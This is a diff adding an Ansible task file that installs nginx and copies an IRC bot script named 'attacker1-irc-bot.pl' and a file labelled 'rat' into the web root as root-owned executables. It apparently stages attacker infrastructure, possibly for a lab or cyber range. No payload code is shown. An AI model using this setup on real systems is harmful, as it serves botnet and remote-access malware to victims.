@@ -1,0 +1,18 @@
+---
+- name: ensure nginx is at the latest version
+  yum: name=nginx state=latest
+
+- name: deploy bot script
+  copy: src=attacker1-irc-bot.pl dest=/usr/share/nginx/html/attacker1-irc-bot.pl owner=root mode=0755
+
+- name: deploy rat
+  copy: src=pp dest=/usr/share/nginx/html/pp owner=root mode=0755
+
+- name: deploy nginx conf
+  copy: src=nginx.conf dest=/etc/nginx/nginx.conf owner=root mode=0755
+  notify:
+  - restart nginx
+
+- name: ensure nginx is enabled and started
+  service: name=nginx enabled=yes state=started
+
